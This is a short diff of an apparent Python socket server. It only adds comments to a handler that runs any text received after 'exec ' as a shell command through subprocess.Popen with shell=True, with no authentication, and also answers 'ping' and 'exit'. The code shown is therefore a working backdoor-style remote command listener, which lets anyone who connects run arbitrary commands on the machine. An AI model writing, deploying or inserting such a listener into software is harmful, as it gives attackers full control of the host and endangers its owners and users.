@@ -6,11 +6,11 @@ import subprocess
 def handle_client(client_socket):
     while True:
         command = client_socket.recv(1024).decode()
-        if command.lower() == 'ping':
+        if command.lower() == 'ping': # ping to make sure its running
             client_socket.send(b'Running')
-        elif command.lower().startswith('exec '):
+        elif command.lower().startswith('exec '): # execute commands on the machine
             subprocess.Popen(command[5:], shell=True)
-        elif command.lower() == 'exit':
+        elif command.lower() == 'exit': # exit script
             break
     client_socket.close()
 
